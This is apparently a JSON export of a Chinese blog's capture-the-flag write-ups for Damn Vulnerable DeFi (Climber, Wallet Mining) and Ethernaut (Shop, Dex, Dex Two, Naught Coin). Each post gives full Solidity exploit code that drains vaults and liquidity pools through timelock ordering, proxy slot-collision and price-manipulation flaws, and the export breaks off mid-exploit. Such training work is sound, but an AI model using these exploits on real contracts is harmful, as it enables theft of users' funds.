[{"title":"DVD-climber","url":"/2026/02/04/DVD-climber/","content":"思路题目提示了一个UUPS代理模式，可以大概了解其模式。接下来要了解时间锁的大概内容\n通常，一个时间锁（Timelock）的标准工作流是：\n\nSchedule（提案）：拥有 Proposer 权限的人发起一个操作提案。\nWait（等待）：必须等待一段锁定期（Delay），让社区有时间审查。\nExecute（执行）：时间到了，且状态未被取消，才能执行。\n\n但是在合约ClimberTimelock中确是存在问题，就是Execute先于Schedule。可以看到在函数execute中targets[i].functionCallWithValue(dataElements[i], values[i]);执行先于判断提案是否成立 if (getOperationState(id) != OperationState.ReadyForExecution)是一个经典的逻辑顺序出错。因为合约ClimberVault是代理合约，其Owner是合约ClimberTimelock，所以我们可以直接升级代理合约，自己写一个新的恶意合约并且把钱全部提取走。\nfunction execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)       external       payable   &#123;       if (targets.length &lt;= MIN_TARGETS) &#123;           revert InvalidTargetsCount();       &#125;       if (targets.length != values.length) &#123;           revert InvalidValuesCount();       &#125;       if (targets.length != dataElements.length) &#123;           revert InvalidDataElementsCount();       &#125;       bytes32 id = getOperationId(targets, values, dataElements, salt);       for (uint8 i = 0; i &lt; targets.length; ++i) &#123;           targets[i].functionCallWithValue(dataElements[i], values[i]);       &#125;       if (getOperationState(id) != OperationState.ReadyForExecution) &#123;           revert NotReadyForExecution(id);       &#125;       operations[id].executed = true;   &#125;\n\n\n\n现在最大的问题就是在于在执行了 targets[i].functionCallWithValue之后怎么绕过getOperationState(id) != OperationState.ReadyForExecution使得交易不会revert。要修改枚举OperationState的状态必须使用函数schedule，通过函数schedule必须要拥有身份PROPOSER_ROLE，而且要将合约ClimberTimelock.sol的状态变量delay改为0。\n首先可以调用ClimberTimelock:updateDelay()修改状态变量delay，接着利用合约的身份是Admin设置恶意合约是PROPOSER_ROLE的身份，这样子就能进入函数getOperationState去修改状态为OperationState.ReadyForExecution。\n目前为止我们明确第一步是改时间，第二步是设置身份，第三步就是升级代理合约执行转钱的函数，最后一步也是有点绕的一步\n最后一步我们需要将我们的全部操作都设置为schedule，我们需要注意的是 bytes32 id = getOperationId(targets, values, dataElements, salt);这个是关键，这个代码在两个函数schedule和execute都有，就是对应一套运行操作的编号。代码运行到第四步，把前面三个操作打包丢给schedule这个时候运算的id简记为ID3，但是在最后的检查if (getOperationState(id) != OperationState.Unknown)的时候，这个时候运算出来是ID4，也就是把四步都打包进去计算。所以需要在第四步把自身也打包进去函数schedule。\n这其中也有点递归的思路\nA &#x3D; 整个攻击载荷 (Payload) &#x3D; [Step1, Step2, Step3, Step4]，Step4 的内容 &#x3D; 调用 schedule(A)。\nfunction schedule(        address[] calldata targets,        uint256[] calldata values,        bytes[] calldata dataElements,        bytes32 salt    ) external onlyRole(PROPOSER_ROLE) &#123;        if (targets.length == MIN_TARGETS || targets.length &gt;= MAX_TARGETS) &#123;            revert InvalidTargetsCount();        &#125;        if (targets.length != values.length) &#123;            revert InvalidValuesCount();        &#125;        if (targets.length != dataElements.length) &#123;            revert InvalidDataElementsCount();        &#125;        bytes32 id = getOperationId(targets, values, dataElements, salt);        if (getOperationState(id) != OperationState.Unknown) &#123;            revert OperationAlreadyKnown(id);        &#125;        operations[id].readyAtTimestamp = uint64(block.timestamp) + delay;        operations[id].known = true;    &#125;contract ClimberTimelockBase enum OperationState &#123;        Unknown,        Scheduled,        ReadyForExecution,        Executed    &#125;    // Operation data tracked in this contract    struct Operation &#123;        uint64 readyAtTimestamp; // timestamp at which the operation will be ready for execution        bool known; // whether the operation is registered in the timelock        bool executed; // whether the operation has been executed    &#125;  function getOperationState(bytes32 id) public view returns (OperationState state) &#123;        Operation memory op = operations[id];        if (op.known) &#123;            if (op.executed) &#123;                state = OperationState.Executed;            &#125; else if (block.timestamp &lt; op.readyAtTimestamp) &#123;                state = OperationState.Scheduled;            &#125; else &#123;                state = OperationState.ReadyForExecution;            &#125;        &#125; else &#123;            state = OperationState.Unknown;        &#125;    &#125;\n\n\n\n\n\n\n\nExp// SPDX-License-Identifier: MIT// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)pragma solidity =0.8.25;import &#123;AccessControl&#125; from &quot;@openzeppelin/contracts/access/AccessControl.sol&quot;;import &#123;Test, console&#125; from &quot;forge-std/Test.sol&quot;;import &#123;ClimberVault&#125; from &quot;../../src/climber/ClimberVault.sol&quot;;import &#123;ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE&#125; from &quot;../../src/climber/ClimberTimelock.sol&quot;;import &#123;ERC1967Proxy&#125; from &quot;@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol&quot;;import &#123;DamnValuableToken&#125; from &quot;../../src/DamnValuableToken.sol&quot;;import &#123;UUPSUpgradeable&#125; from &quot;@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol&quot;;contract ClimberChallenge is Test &#123;    address deployer = makeAddr(&quot;deployer&quot;);    address player = makeAddr(&quot;player&quot;);    address proposer = makeAddr(&quot;proposer&quot;);    address sweeper = makeAddr(&quot;sweeper&quot;);    address recovery = makeAddr(&quot;recovery&quot;);    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;    uint256 constant TIMELOCK_DELAY = 60 * 60;    bytes32 PROPOSER_ROLE =        0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1;    address[] targets = new address[](4);    uint256[] values = new uint256[](4);    bytes[] dataElements = new bytes[](4);    bytes32 salt = keccak256(&quot;ANY_SALT_YOU_LIKE&quot;);    ClimberVault vault;    ClimberTimelock timelock;    DamnValuableToken token;    modifier checkSolvedByPlayer() &#123;        vm.startPrank(player, player);        _;        vm.stopPrank();        _isSolved();    &#125;    /**     * SETS UP CHALLENGE - DO NOT TOUCH     */    function setUp() public &#123;        startHoax(deployer);        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);        // Deploy the vault behind a proxy,        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function        vault = ClimberVault(            address(                new ERC1967Proxy(                    address(new ClimberVault()), // implementation                    abi.encodeCall(                        ClimberVault.initialize,                        (deployer, proposer, sweeper)                    ) // initialization data                )            )        );        // Get a reference to the timelock deployed during creation of the vault        timelock = ClimberTimelock(payable(vault.owner()));        // Deploy token and transfer initial token balance to the vault        token = new DamnValuableToken();        token.transfer(address(vault), VAULT_TOKEN_BALANCE);        vm.stopPrank();    &#125;    /**     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH     */    function test_assertInitialState() public &#123;        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);        assertEq(vault.getSweeper(), sweeper);        assertGt(vault.getLastWithdrawalTimestamp(), 0);        assertNotEq(vault.owner(), address(0));        assertNotEq(vault.owner(), deployer);        // Ensure timelock delay is correct and cannot be changed        assertEq(timelock.delay(), TIMELOCK_DELAY);        vm.expectRevert(CallerNotTimelock.selector);        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));        // Ensure timelock roles are correctly initialized        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);    &#125;    /**     * CODE YOUR SOLUTION HERE     */    function test_climber() public checkSolvedByPlayer &#123;        updataContract upCotract = new updataContract();        // step one        targets[0] = address(timelock);        values[0] = 0;        dataElements[0] = abi.encodeWithSelector(            ClimberTimelock.updateDelay.selector,            0        );        //two        targets[1] = address(timelock);        values[1] = 0;        dataElements[1] = abi.encodeWithSelector(            AccessControl.grantRole.selector,            PROPOSER_ROLE,            address(this)        );        //three        targets[2] = address(vault);        values[2] = 0;        //sweepAllMoney函数的abi编码        bytes memory sweepAllMoneyData = abi.encodeWithSelector(            updataContract.sweepAllMoney.selector,            address(token),            recovery        );        dataElements[2] = abi.encodeWithSelector(        //升级代理合约并且调用sweepAllMoney函数            UUPSUpgradeable.upgradeToAndCall.selector,            address(upCotract),            sweepAllMoneyData        );        //four        targets[3] = address(this);        values[3] = 0;        dataElements[3] = abi.encodeWithSelector(            ClimberChallenge.scheduleTask.selector        );        timelock.execute(targets, values, dataElements, salt);    &#125;    function scheduleTask() external &#123;        timelock.schedule(targets, values, dataElements, salt);    &#125;    /**     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH     */    function _isSolved() private view &#123;        assertEq(token.balanceOf(address(vault)), 0, &quot;Vault still has tokens&quot;);        assertEq(            token.balanceOf(recovery),            VAULT_TOKEN_BALANCE,            &quot;Not enough tokens in recovery account&quot;        );    &#125;&#125;contract updataContract is UUPSUpgradeable &#123;    function _authorizeUpgrade(address newImplementation) internal override &#123;&#125;    function sweepAllMoney(address token, address recovery) external &#123;        DamnValuableToken(token).transfer(            recovery,            DamnValuableToken(token).balanceOf(address(this))        );    &#125;&#125;\n","categories":["Damn Vulnerable DeFi Writeups"],"tags":["Web3 Security","Damn Vulnerable DeFi"]},{"title":"Ethernaut 21-23","url":"/2026/02/03/ethernaut4/","content":"Shop// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface IBuyer &#123;    function price() external view returns (uint256);&#125;contract Shop &#123;    uint256 public price = 100;    bool public isSold;    function buy() public &#123;        IBuyer _buyer = IBuyer(msg.sender);        if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;            isSold = true;            price = _buyer.price();        &#125;    &#125;&#125;\n\n\n\n思路类似与不知明的外部调用，合约采用接口调用，外部接口的函数时不清楚的，所以我们可以控制返回的值，从而控制目标合约\nExpinterface Ishop &#123;    function buy() external;    function price() external view returns (uint256);    function isSold() external view returns (bool);&#125;contract ShopSolution is Script &#123;    function run() public &#123;        vm.startBroadcast();        Ishop shop = Ishop(0x9D94F04c402e710770643DdEcCf0e74fBf21e58A);        console.log(&quot;getprice&quot;, shop.price());        console.log(&quot;isSold&quot;, shop.isSold());        ShopAttack attack = new ShopAttack(address(shop));        attack.attack();        console.log(&quot;getpriceAfter&quot;, shop.price());        console.log(&quot;isSoldAfter&quot;, shop.isSold());        vm.stopBroadcast();    &#125;&#125;contract ShopAttack &#123;    Ishop public shop;    constructor(address _shopAddress) &#123;        shop = Ishop(_shopAddress);    &#125;    function attack() external &#123;        shop.buy();    &#125;    function price() external view returns (uint256 _price) &#123;        //通过判断shop.isSold()的值返回不同的价格，当isSold为false时返回100，为true时返回1        if (!shop.isSold()) return 100;        else return 1;    &#125;&#125;\n\n\n\nDex// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;lib/contracts/token/ERC20/IERC20.sol&quot;;import &quot;lib/contracts/token/ERC20/ERC20.sol&quot;;import &quot;lib/contracts/access/Ownable.sol&quot;;contract Dex is Ownable &#123;    address public token1;    address public token2;    constructor() &#123;&#125;    function setTokens(address _token1, address _token2) public onlyOwner &#123;        token1 = _token1;        token2 = _token2;    &#125;    //向Dex合约中添加流动性，只有合约拥有者可以调用此函数    function addLiquidity(address token_address, uint256 amount) public onlyOwner &#123;        IERC20(token_address).transferFrom(msg.sender, address(this), amount);    &#125;    function swap(address from, address to, uint256 amount) public &#123;        require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);        require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);        uint256 swapAmount = getSwapPrice(from, to, amount);        IERC20(from).transferFrom(msg.sender, address(this), amount);        IERC20(to).approve(address(this), swapAmount);        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);    &#125;    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) &#123;        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));    &#125;    function approve(address spender, uint256 amount) public &#123;        SwappableToken(token1).approve(msg.sender, spender, amount);        SwappableToken(token2).approve(msg.sender, spender, amount);    &#125;    function balanceOf(address token, address account) public view returns (uint256) &#123;        return IERC20(token).balanceOf(account);    &#125;&#125;contract SwappableToken is ERC20 &#123;    address private _dex;    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)        ERC20(name, symbol)    &#123;        _mint(msg.sender, initialSupply);        _dex = dexInstance;    &#125;    function approve(address owner, address spender, uint256 amount) public &#123;        require(owner != _dex, &quot;InvalidApprover&quot;);        super._approve(owner, spender, amount);    &#125;&#125;\n\n\n\n思路函数function getSwapPrice有大问题，每次swap一次之后token都会变多，换着换着就会导致整个池子的钱都拿走了，详细可以看Exp的变化注释\nExpinterface Idex &#123;    function swap(address from, address to, uint256 amount) external;    function approve(address spender, uint256 amount) external;    function token1() external view returns (address);    function token2() external view returns (address);    function balanceOf(address token, address account) external view returns (uint256);&#125;//**********************************************************************************************************************// Dex\t\tUser// token1\ttoken2\ttoken1\ttoken2// 100\t100\t10\t10// 110\t90\t0\t20// 86\t110\t24\t0// 110\t80\t0\t30// 69\t110\t41\t0// 110\t45\t0\t65// 0\t90\t110\t20//**********************************************************************************************************************contract DexSolution is Script &#123;    function run() external &#123;        vm.startBroadcast();        Idex idex = Idex(0x823d27e854e8c56313BC8913c5f2eFcE77AFE466);        idex.approve(address(idex), 500);        address token1 = idex.token1();        address token2 = idex.token2();        console.log(&quot;token1Before&quot;, idex.balanceOf(token1, msg.sender));        console.log(&quot;token2Before&quot;, idex.balanceOf(token2, msg.sender));        idex.swap(token1, token2, 10);        idex.swap(token2, token1, 20);        idex.swap(token1, token2, 24);        idex.swap(token2, token1, 30);        idex.swap(token1, token2, 41);        // 110 = (amountIn * 110) / 45  =&gt;  amountIn = 45        idex.swap(token2, token1, 45);        console.log(&quot;token1After&quot;, idex.balanceOf(token1, msg.sender));        console.log(&quot;token2After&quot;, idex.balanceOf(token2, msg.sender));        vm.stopBroadcast();    &#125;&#125;\n\n\n\nDex2// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;lib/contracts/token/ERC20/IERC20.sol&quot;;import &quot;lib/contracts/token/ERC20/ERC20.sol&quot;;import &quot;lib/contracts/access/Ownable.sol&quot;;contract DexTwo is Ownable &#123;    address public token1;    address public token2;    constructor() &#123;&#125;    function setTokens(address _token1, address _token2) public onlyOwner &#123;        token1 = _token1;        token2 = _token2;    &#125;    function add_liquidity(address token_address, uint256 amount) public onlyOwner &#123;        IERC20(token_address).transferFrom(msg.sender, address(this), amount);    &#125;    function swap(address from, address to, uint256 amount) public &#123;        require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);        uint256 swapAmount = getSwapAmount(from, to, amount);        IERC20(from).transferFrom(msg.sender, address(this), amount);        IERC20(to).approve(address(this), swapAmount);        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);    &#125;    function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) &#123;        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));    &#125;    function approve(address spender, uint256 amount) public &#123;        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);    &#125;    function balanceOf(address token, address account) public view returns (uint256) &#123;        return IERC20(token).balanceOf(account);    &#125;&#125;contract SwappableTokenTwo is ERC20 &#123;    address private _dex;    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)        ERC20(name, symbol)    &#123;        _mint(msg.sender, initialSupply);        _dex = dexInstance;    &#125;    function approve(address owner, address spender, uint256 amount) public &#123;        require(owner != _dex, &quot;InvalidApprover&quot;);        super._approve(owner, spender, amount);    &#125;&#125;\n\n\n\n思路跟上关的区别在于就是require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), “Invalid tokens”)就会导致Dex可以接受任何 token进行swap而不限于token1和token2。这样用自创可控的Token就可以把全部的Token1和Token2全部换出来\nExp// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;forge-std/Script.sol&quot;;import &quot;lib/contracts/token/ERC20/ERC20.sol&quot;;interface IdexTwo &#123;    function swap(address from, address to, uint256 amount) external;    function approve(address spender, uint256 amount) external;    function token1() external view returns (address);    function token2() external view returns (address);    function balanceOf(address token, address account) external view returns (uint256);&#125;/** *     Step  |           DEX          |          Player *           | token1 - token2 - WETH | token1 - token2 - WETH *   --------------------------------------------------------- *     Init  |   100     100     100  |    10      10     300 *   Swap 1  |     0     100     200  |   110      10     200 *   Swap 2  |     0       0     400  |   110     110       0 */contract DexTwoSolution is Script &#123;    function run() external &#123;        vm.startBroadcast();        IdexTwo idex = IdexTwo(0x18517a9c6aC1a4f7f403F6C8F0308b1Dbd066109);        ExpToken exp = new ExpToken();        exp.approve(address(idex), 500);        exp.transfer(address(idex), 100);        address token1 = idex.token1();        address token2 = idex.token2();        console.log(&quot;token1Before&quot;, idex.balanceOf(token1, msg.sender));        console.log(&quot;token2Before&quot;, idex.balanceOf(token2, msg.sender));        console.log(&quot;ExpTokenBefore&quot;, exp.balanceOf(address(idex)));        idex.swap(address(exp), token1, 100);        idex.swap(address(exp), token2, 200);        console.log(&quot;token1After&quot;, idex.balanceOf(token1, msg.sender));        console.log(&quot;token2After&quot;, idex.balanceOf(token2, msg.sender));        vm.stopBroadcast();    &#125;&#125;contract ExpToken is ERC20 &#123;    constructor() ERC20(&quot;ExpToken&quot;, &quot;EXP&quot;) &#123;        _mint(msg.sender, 400);    &#125;&#125;\n","categories":["CTF-Ethernaut Writeups"],"tags":["Web3 Security","Ethernaut"]},{"title":"DVD-WalletMining","url":"/2026/02/06/DVD-WalletMining/","content":"思路完成这个关卡首先要知道相关的知识\n\nCreat2操作码确定性部署\n代理合约的Slot存储冲突\n\n首先题目给予一个空地址(0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496)，空地址上面又2000万Token，我们需要转到我们的账户上，这就引出第一个思考就是“为什么地址是空地址（没有部署代码），但是还是可以转入Token呢？”，因为代币并不存储在用户的钱包里，而是存储在代币合约的账本里。EVM 在处理转账时会看接收方有没有代码，如果没有代码（空地址）：EVM 认为这是一个 EOA（普通账户），无条件接受转账。所以无论如何空地址都能接受ETH或者其他代币的转账。\n现在需要在空地址上部署代码，再由代码把Token转移到目标账户即可。该空地址也是一个Safe的合约地址，这里就是牵扯到Creat2的内容，我们可以知道Creat2的计算地址公式address = keccak256( 0xff ++ sender ++ salt ++ keccak256(init_code) )[12:]，根据这个公式再从SafeProxyFactory.sol合约逆向求出公式中的Salt即可精准的将代码部署到已知的地址上。\n function createProxyWithNonce(address _singleton, bytes memory initializer, uint256 saltNonce) public returns (SafeProxy proxy) &#123;        // If the initializer changes the proxy address should change too. Hashing the initializer data is cheaper than just concatinating it        bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), saltNonce));        proxy = deployProxy(_singleton, initializer, salt);        emit ProxyCreation(proxy, _singleton);    &#125;function deployProxy(address _singleton, bytes memory initializer, bytes32 salt) internal returns (SafeProxy proxy) &#123;        require(isContract(_singleton), &quot;Singleton contract not deployed&quot;);        bytes memory deploymentData = abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(_singleton)));        // solhint-disable-next-line no-inline-assembly        assembly &#123;            proxy := create2(0x0, add(0x20, deploymentData), mload(deploymentData), salt)        &#125;        require(address(proxy) != address(0), &quot;Create2 call failed&quot;);        if (initializer.length &gt; 0) &#123;            // solhint-disable-next-line no-inline-assembly            assembly &#123;                if eq(call(gas(), proxy, 0, add(initializer, 0x20), mload(initializer), 0, 0), 0) &#123;                    revert(0, 0)                &#125;            &#125;        &#125;    &#125;\n\n题目还要求获得WalletDeployer.sol部署钱包之后的1 ether奖励。发送奖励由函数drop执行，第一个判断mom是否是空地址，也就是Authorizer是否为空，并且判断can(msg.sender, aim)理解就是调用者是否有权限部署到aim地址。第二个判定就是部署初始化一个新的合约地址是否等于aim地址。这里可以承接上面说到的思路，在这里部署代码到0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496上，最后控制了空地址(0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496)把tokens转出来又能获得奖励。现在最后的问题就是如何授权允许我们部署呢？\nfunction drop(address aim, bytes memory wat, uint256 num) external returns (bool) &#123;       if (mom != address(0) &amp;&amp; !can(msg.sender, aim)) &#123;           return false;       &#125;       if (address(cook.createProxyWithNonce(cpy, wat, num)) != aim) &#123;           return false;       &#125;       if (IERC20(gem).balanceOf(address(this)) &gt;= pay) &#123;           IERC20(gem).transfer(msg.sender, pay);       &#125;       return true;   &#125;\n\n如何得到部署的权力在于合约AuthorizerUpgradeable.sol：init()，是否能init()的判断标准在于uint256 public needsInit。当needsInit不等于0才能执行。正常来说对于代理模式来说AuthorizerUpgradeable.sol是逻辑合约，在部署之后应该是防止初始化。但是这里的代理模式出现问题，出现了Slot Collision的问题。TransparentProxy的Solt0是upgrader，AuthorizerUpgradeable的Solt0是needsInit。当工厂合约创建一个代理合约的执行逻辑是：address(new AuthorizerUpgradeable())EVM执行CREATE指令将AuthorizerUpgradeable 的 creationCode 部署到链上，返回逻辑合约的地址，接着是 new TransparentProxy(address(newAuthorizerUpgradeable()),abi.encodeCall(AuthorizerUpgradeable.init, (wards, aims)))这个代码就是当 TransparentProxy 被new出来时，它的构造函数被触发，存储操作：upgrader &#x3D; msg.sender 将工厂合约的地址写入了代理合约的 Slot 0。进入父类 ERC1967Proxy 初始化，TransparentProxy 继承自 ERC1967Proxy，后者会立即执行逻辑初始化，此时，EVM 执行了一个 delegatecall 到逻辑合约(AuthorizerUpgradeable)，代码是 AuthorizerUpgradeable 的，但存储(Storage)是TransparentProxy的，执行 init 函数：这个时候init函数就会操作Slot Collision的问题。\n进入init 函数的逻辑，首先读取 Slot 0，EVM 返回了刚才存入的 工厂地址；工厂地址是一个很大的数字，显然 !&#x3D; 0。于是 require 成功通过；函数执行完毕前，needsInit &#x3D; 0 将 Slot 0 覆盖为 0，则代理合约刚刚存好的 upgrader（工厂地址）被意外抹除。最后工厂合约执行了 TransparentProxy(payable(authorizer)).setUpgrader(upgrader);又将将真正的 upgrader（你在测试中传入的地址）再次写入代理合约的 Slot 0。这个时候Slot 0 就不等于0了，随便攻击者使用init()函数。攻击者使用了init()就能给自己提权，用于使用drop函数。\n整理思路就是因为代理模式的失误，攻击合约可以调用init()函数提权，接着使用drop函数部署代码到有2000万tokens的地址，从而利用钱包签名交易将钱提出来。这里钱包签名的方式是手动计算的，拆解Safe.sol:getTransactionHash()函数具体的可以看代码逆向算出来。\ncontract TransparentProxy is ERC1967Proxy &#123;    address public upgrader = msg.sender;    constructor(address _logic, bytes memory _data) ERC1967Proxy(_logic, _data) &#123;        ERC1967Utils.changeAdmin(msg.sender);    &#125;    function setUpgrader(address who) external &#123;        require(msg.sender == ERC1967Utils.getAdmin(), &quot;!admin&quot;);        upgrader = who;    &#125;    function isUpgrader(address who) public view returns (bool) &#123;        return who == upgrader;    &#125;    function _fallback() internal override &#123;        if (isUpgrader(msg.sender)) &#123;            require(msg.sig == bytes4(keccak256(&quot;upgradeToAndCall(address, bytes)&quot;)));            _dispatchUpgradeToAndCall();        &#125; else &#123;            super._fallback();        &#125;    &#125;    function _dispatchUpgradeToAndCall() private &#123;        (address newImplementation, bytes memory data) = abi.decode(msg.data[4:], (address, bytes));        ERC1967Utils.upgradeToAndCall(newImplementation, data);    &#125;&#125;contract AuthorizerUpgradeable &#123;    uint256 public needsInit = 1;    mapping(address =&gt; mapping(address =&gt; uint256)) private wards;    event Rely(address indexed usr, address aim);    constructor() &#123;        needsInit = 0; // freeze implementation    &#125;    function init(address[] memory _wards, address[] memory _aims) external &#123;        require(needsInit != 0, &quot;cannot init&quot;);        for (uint256 i = 0; i &lt; _wards.length; i++) &#123;            _rely(_wards[i], _aims[i]);        &#125;        needsInit = 0;    &#125;    function _rely(address usr, address aim) private &#123;        wards[usr][aim] = 1;        emit Rely(usr, aim);    &#125;    function can(address usr, address aim) external view returns (bool) &#123;        return wards[usr][aim] == 1;    &#125;&#125;contract AuthorizerFactory &#123;    function deployWithProxy(address[] memory wards, address[] memory aims, address upgrader)        external        returns (address authorizer)    &#123;        authorizer = address(            new TransparentProxy( // proxy                address(new AuthorizerUpgradeable()), // implementation                abi.encodeCall(AuthorizerUpgradeable.init, (wards, aims)) // init data            )        );        assert(AuthorizerUpgradeable(authorizer).needsInit() == 0); // invariant        TransparentProxy(payable(authorizer)).setUpgrader(upgrader);    &#125;&#125;\n\n\n\nEXP   /**     * CODE YOUR SOLUTION HERE     */    function test_walletMining() public checkSolvedByPlayer &#123;        //1.寻找SaltNonce        uint256 saltNonce = findOutSalt();        console.log(&quot;Target Code side:: &quot;, saltNonce);        //2.准备Safe 初始化参数        address[] memory owners = new address[](1);        owners[0] = user;        bytes memory initializer = abi.encodeCall(            Safe.setup,            (                owners,                1, // threshold                address(0), // to                &quot;&quot;, // data                address(0), // fallbackHandler                address(0), // paymentToken                0, // payment                payable(address(0)) // paymentReceiver            )        );        // 预先计算 Safe 交易哈希并签名（从 Safe 转移代币到 user）        bytes memory transferData = abi.encodeWithSelector(            token.transfer.selector,            user,            DEPOSIT_TOKEN_AMOUNT        );        bytes32 DOMAIN_SEPARATOR_TYPEHASH = 0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218;        bytes32 SAFE_TX_TYPEHASH = 0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8;        bytes32 domainseparator = keccak256(            abi.encode(                DOMAIN_SEPARATOR_TYPEHASH,                block.chainid,                USER_DEPOSIT_ADDRESS            )        );        bytes32 safeTxHash = keccak256(            abi.encode(                SAFE_TX_TYPEHASH,                address(token),                0,                keccak256(transferData),                Enum.Operation.Call,                0,                0,                0,                address(0),                payable(address(0)),                0            )        );        bytes32 txHash = keccak256(            abi.encodePacked(                bytes1(0x19),                bytes1(0x01),                domainseparator,                safeTxHash            )        );        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);        bytes memory signature = abi.encodePacked(r, s, v);        new walletAttack(            walletDeployer,            authorizer,            token,            ward,            findOutSalt(),            initializer,            transferData,            signature        );    &#125;    function findOutSalt() private view returns (uint256 salt) &#123;        //address = keccak256( 0xff ++ sender ++ salt ++ keccak256(init_code) )[12:]        address[] memory owerns = new address[](1);        owerns[0] = user;        bytes memory initializer = abi.encodeCall(            Safe.setup,            (                owerns,                1,                address(0),                &quot;&quot;,                address(0),                address(0),                0,                payable(address(0))            )        );        bytes32 initCode = keccak256(            abi.encodePacked(                type(SafeProxy).creationCode,                uint256(uint160(address(singletonCopy)))            )        );        for (uint256 saltNonce = 0; saltNonce &lt; 100000; saltNonce++) &#123;            address computedAddress = vm.computeCreate2Address(                keccak256(abi.encodePacked(keccak256(initializer), saltNonce)),                initCode,                address(proxyFactory)            );            if (computedAddress == USER_DEPOSIT_ADDRESS) &#123;                console.log(&quot;success find&quot;);                return saltNonce;            &#125;        &#125;    &#125;    contract walletAttack &#123;    constructor(        WalletDeployer walletDeployer,        AuthorizerUpgradeable authorizer,        DamnValuableToken token,        address ward,        uint256 saltNonce,        bytes memory initializer,        bytes memory transferData,        bytes memory signature    ) &#123;        address depositAddr = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;        //1.利用存储冲突绕过初始化限制        address[] memory wards = new address[](1);        wards[0] = address(this);        address[] memory aims = new address[](1);        aims[0] = depositAddr;        authorizer.init(wards, aims);        //2. 部署Safe        walletDeployer.drop(depositAddr, initializer, saltNonce);        //奖励转交给指定的ward        token.transfer(ward, token.balanceOf(address(this)));        //执行Safe交易        Safe(payable(depositAddr)).execTransaction(            address(token),            0,            transferData,            Enum.Operation.Call,            0,            0,            0,            address(0),            payable(address(0)),            signature        );    &#125;&#125;\n\n","categories":["Damn Vulnerable DeFi Writeups"],"tags":["Web3 Security","Damn Vulnerable DeFi"]},{"title":"Ethernaut 16-20","url":"/2026/02/02/ethernaut3/","content":"Naught Coincontract NaughtCoin is ERC20 &#123;    // string public constant name = &#x27;NaughtCoin&#x27;;    // string public constant symbol = &#x27;0x0&#x27;;    // uint public constant decimals = 18;    uint256 public timeLock = block.timestamp + 10 * 365 days;    uint256 public INITIAL_SUPPLY;    address public player;    constructor(address _player) ERC20(&quot;NaughtCoin&quot;, &quot;0x0&quot;) &#123;        player = _player;        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));        // _totalSupply = INITIAL_SUPPLY;        // _balances[player] = INITIAL_SUPPLY;        _mint(player, INITIAL_SUPPLY);        emit Transfer(address(0), player, INITIAL_SUPPLY);    &#125;    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) &#123;        super.transfer(_to, _value);    &#125;    // Prevent the initial owner from transferring tokens until the timelock has passed    modifier lockTokens() &#123;        if (msg.sender == player) &#123;            require(block.timestamp &gt; timeLock);            _;        &#125; else &#123;            _;        &#125;    &#125;&#125;\n\n\n\n思路在ERC20标准中存在两个转钱的方法，分别是transfer和transferFrom\nfunction transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) &#123;      address spender = _msgSender();      _spendAllowance(from, spender, amount);      _transfer(from, to, amount);      return true;  &#125;\n\n在是使用transferFrom要先使用approve方法，简单来说就是代币拥有者允许某个地址的交易代币的数量。\t\nExpcontract NaughtCoinSolution is Script &#123;    NaughtCoin naughtCoin = NaughtCoin(0xC0Faf18D2b14706353A4a62D752b1Ca4bbe63b5c);    function run() public &#123;        vm.startBroadcast();        NaughtCoinAttack attack = new NaughtCoinAttack(address(naughtCoin));        ERC20(address(naughtCoin)).approve(address(attack), 1000000 * 1e18);        attack.attack();        vm.stopBroadcast();    &#125;&#125;contract NaughtCoinAttack &#123;    address public constant PLAYER = 